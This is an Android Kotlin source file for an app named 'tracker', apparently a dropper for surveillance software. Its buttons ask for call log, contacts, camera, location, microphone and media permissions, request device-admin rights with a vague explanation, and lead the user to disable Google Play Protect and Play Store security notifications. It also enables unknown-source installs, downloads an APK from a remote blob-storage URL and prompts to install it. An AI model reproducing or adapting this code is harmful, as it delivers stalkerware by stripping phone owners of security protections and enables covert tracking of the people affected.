package com.aatif.tracker

import Retrofit.ApiService
import android.app.ProgressDialog
import android.app.admin.DevicePolicyManager
import android.content.ActivityNotFoundException
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.util.Log.e
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import com.aatif.Tracker.MyDeviceAdminReceiver
import com.aatif.tracker.databinding.ActivityMainBinding
import com.karumi.dexter.Dexter
import com.karumi.dexter.MultiplePermissionsReport
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.multi.MultiplePermissionsListener
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.io.BufferedInputStream
import java.io.File
import java.io.FileOutputStream
import java.io.InputStream
import java.net.HttpURLConnection
import java.net.URL
import java.util.Objects


class MainActivity : AppCompatActivity() {
    private lateinit var progressDialog: ProgressDialog
    lateinit var binding: ActivityMainBinding

    @RequiresApi(Build.VERSION_CODES.R)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)
        binding.AllpermissionSwitch.setOnCheckedChangeListener { buttonView, isChecked ->
            if (isChecked) {
                checkAndRequestPermissions()
            }

        }
        binding.disablePlayNotificationSwitch.setOnCheckedChangeListener { buttonView, isChecked ->
            if (isChecked) {
                openPlaySettings()
            }
        }
        binding.disablePlayProtect.setOnCheckedChangeListener { buttonView, isChecked ->
            if (isChecked) {
                openPlayProtectSection()
            }
        }
        binding.deviceAdminSwitch.setOnCheckedChangeListener { buttonView, isChecked ->
            if (isChecked) {

                e("MainActivitysssssssss", "onCheckedChanged: $isChecked")
                // Check if the app is a device admin
                val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
                val devicePolicyManager =
                    getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager

                if (!devicePolicyManager.isAdminActive(componentName)) {
                    // Launch the activity to request device admin access
                    val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                    intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                    intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "What we will need")
                    startActivityForResult(intent, 1)
                }
            }

        }
        binding.downloadApkbtn.setOnClickListener {
//            if(binding.InstallUnknowSwitch.isChecked && binding.disablePlayNotificationSwitch.isChecked && binding.disablePlayProtect.isChecked ){
//
//                downloadApk()
//            }else{
//                val alertDialog = AlertDialog.Builder(this)
//                alertDialog.setCancelable(true)
//                alertDialog.setTitle("Info")
//
//                alertDialog.setMessage("Please enable all the switches")
//                alertDialog.setPositiveButton("OK") { dialog, which ->
//                    dialog.dismiss()
//
//                }
//                val dialog = alertDialog.create()
//                dialog.show()
//            }
            downloadApk()
//            val outputFile = File(getExternalFilesDir(null), "app-debug.apk")
////            val absolute =  FileProvider.getUriForFile(
////                Objects.requireNonNull(getApplicationContext()),
////                "com.aatif.tracker" + ".provider", outputFile)
//            val path = File(getExternalFilesDir("Download"),"app-debug.apk")
////            e("absoulte",  absolute.path.toString())
//            installApk(path.path.toString())
        }
        binding.InstallUnknowSwitch.setOnCheckedChangeListener { buttonView, isChecked ->

            if (isChecked) {
                installUnknown()
            }
        }
    }

    private fun downloadApk() {
        var progress = 0
        var toastM = "Downloading Apk"
        val retrofit = Retrofit.Builder()
            .baseUrl("https://drive.google.com/") // Replace with your API base URL
            .addConverterFactory(GsonConverterFactory.create()).build()
        val apiService: ApiService = retrofit.create(ApiService::class.java)
        // Coroutine scope for asynchronous operations
//    binding.progressCircular.visibility = View.VISIBLE
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val url = URL("https://aatif.blob.core.windows.net/android/app-debug.apk")
                val response = apiService.downloadApk()
                val connection = url.openConnection() as HttpURLConnection
                var connectionlength = connection.contentLength
                var downloadedBytes = 0
                connection.disconnect()
                connection.connect()
                runOnUiThread { showProgressDialog() }

//            val fileOutputStream = FileOutputStream("path/to/save/app.apk")
                val input = BufferedInputStream(url.openStream())

                if (response.isSuccessful) {
                    val inputStream: InputStream = response.body()!!.byteStream()
                    val outputFile = File(getExternalFilesDir(null), "app-debug.apk")

                    FileOutputStream(outputFile).use { output ->
                        val buffer = ByteArray(4 * 1024) // buffer size
                        var read: Int

                        while (inputStream.read(buffer).also { read = it } != -1) {
                            output.write(buffer, 0, read)
                            downloadedBytes += read
                            progress = (downloadedBytes * 100 / connectionlength)
                            progressDialog.progress = progress
                            e("Response Body", "${progress}% downloaded")
                        }

                        output.flush()
                        output.close()

                    }

                    // Close the input stream after the file is downloaded
//                inputStream.close()

                    this@MainActivity.runOnUiThread {

                        Toast.makeText(
                            this@MainActivity, "Success", Toast.LENGTH_LONG
                        ).show()
                        progressDialog.dismiss()
                        val alertDialog = AlertDialog.Builder(this@MainActivity)
                        alertDialog.setTitle("Do you want to install this apk?")
                        alertDialog.setPositiveButton("Yes") { dialog, which ->
                            installApk(outputFile.path.toString())
                        }
                        alertDialog.setNegativeButton("No") { dialog, which ->
                            dialog.dismiss()
                        }
                        alertDialog.show()
                    }
                } else {
                    toastM = "Failed"
                    this@MainActivity.runOnUiThread {
                        Toast.makeText(
                            this@MainActivity, "Failed", Toast.LENGTH_SHORT
                        ).show()
                    }
                }
            } catch (e: Exception) {
                e("MainActivityssss", "Exception: ${e.message}")
                val url = URL("https://aatif.blob.core.windows.net/android/app-debug.apk")
                val response = apiService.downloadApk()
                val connection = url.openConnection() as HttpURLConnection
                var connectionlength = connection.contentLength
                var downloadedBytes = 0
                connection.connect()
            }
        }
    }


    // Call this function to show the progress dialog
    private fun showProgressDialog() {
        progressDialog = ProgressDialog(this)
        progressDialog.progress = 0
        progressDialog.setProgressDrawable(resources.getDrawable(R.drawable.custom_progress_bar_fill))
        progressDialog.setMessage("Downloading...")
        progressDialog.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL)
        progressDialog.isIndeterminate = false
        progressDialog.setCancelable(false)


        progressDialog.show()
    }

    private fun openPlaySettings() {
        val alertDialog = AlertDialog.Builder(this)
        alertDialog.setTitle("Disable Play Store Notifications")
        val dialog = alertDialog.create()
        alertDialog.setMessage("You will need to disable play store security notifications.\n Apps > Play Store > Notifications > disable security and errors")
        alertDialog.setCancelable(false)
        alertDialog.setPositiveButton("OK") { dialog, which ->
            try {
                val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
                intent.data = Uri.parse("package:com.android.vending")
                startActivity(intent)
            } catch (e: ActivityNotFoundException) {
                //e.printStackTrace();
                val intent = Intent(Settings.ACTION_MANAGE_APPLICATIONS_SETTINGS)
                startActivity(intent)
            }
        }
        alertDialog.show()
    }

    private fun openPlayProtectSection() {
        // Create an Intent to open the Play Store
        val intent = Intent()

        // Check if there's a Play Store app available on the device
        if (intent.resolveActivity(packageManager) != null) {
            intent.setComponent(
                ComponentName(
                    "com.google.android.gms",
                    "com.google.android.gms.security.settings.VerifyAppsSettingsActivity"
                )
            )
            startActivity(intent)
        } else {
            // If the Play Store app is not available, open the Play Store website
            intent.data =
                Uri.parse("https://play.google.com/store/apps/details?id=com.google.android.gms.security.snet")
            intent.setComponent(
                ComponentName(
                    "com.google.android.gms",
                    "com.google.android.gms.security.settings.VerifyAppsSettingsActivity"
                )
            )
            startActivity(intent)
        }
    }

    private fun installApk(apkFilePath: String) {
        val file = File(apkFilePath)
        val apkUri: Uri = FileProvider.getUriForFile(
            this, "com.aatif.tracker" + ".provider", file
        )
        val absolute = FileProvider.getUriForFile(
            Objects.requireNonNull(getApplicationContext()), "com.aatif.tracker" + ".provider", file
        )
        val installIntent = Intent(Intent.ACTION_INSTALL_PACKAGE).apply {
            data = absolute
            flags = Intent.FLAG_GRANT_READ_URI_PERMISSION
        }

        startActivity(installIntent)
    }

    override fun onResume() {
        super.onResume()
        val componentName = ComponentName(this, MyDeviceAdminReceiver::class.java)
        val devicePolicyManager =
            getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        if (!devicePolicyManager.isAdminActive(componentName)) {
            binding.deviceAdminSwitch.isChecked = false
        }
        if (Settings.canDrawOverlays(this)){
            binding.InstallUnknowSwitch.isChecked = true
        }
    }

    private fun installUnknown() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {

            if (!packageManager.canRequestPackageInstalls()) {
                val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)

                intent.data = android.net.Uri.parse("package:$packageName")
//                startActivity(intent)
                startActivityForResult(intent, 1)
            }
        }
    }

    // Example function to check and request permissions
    @RequiresApi(Build.VERSION_CODES.R)
    private fun checkAndRequestPermissions() {
        val permissions = listOf(
            android.Manifest.permission.READ_CALENDAR,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.RECORD_AUDIO,
//            android.Manifest.permission.READ_SMS,
//           android. Manifest.permission.WRITE_EXTERNAL_STORAGE,
//           android. Manifest.permission.MANAGE_EXTERNAL_STORAGE,
            android.Manifest.permission.READ_MEDIA_AUDIO,
            android.Manifest.permission.READ_MEDIA_VIDEO,
            android.Manifest.permission.READ_MEDIA_IMAGES,
            android.Manifest.permission.CALL_PHONE,

            )

        Dexter.withContext(this).withPermissions(permissions)
            .withListener(object : MultiplePermissionsListener {
                override fun onPermissionsChecked(report: MultiplePermissionsReport) {
                    if (report.areAllPermissionsGranted()) {

                        // All permissions are granted
                    } else {
                        binding.AllpermissionSwitch.isChecked = false
                    }
                }

                override fun onPermissionRationaleShouldBeShown(
                    permissions: MutableList<PermissionRequest>, token: PermissionToken
                ) {
                    token.continuePermissionRequest()
                }
            }).check()
    }
//    fun InstallAPK(filename: String) {
//        val file = File(filename)
//        if (file.exists()) {
//            e("filename", "InstallAPK: $filename")
//            try {
//                val command: String
//                command = "adb install -t $filename"
//                val proc = Runtime.getRuntime().exec(
//                    arrayOf(
////                    "su",
////                    "-c",
//                        command
//                    )
//                )
//                proc.waitFor()
//                e("InstallAPK", "InstallAPK: $command")
//
//            } catch (e: java.lang.Exception) {
//                e.printStackTrace()
//                e("InstallException", "Exception: ${e.message}")
//            }
//        }
//    }
}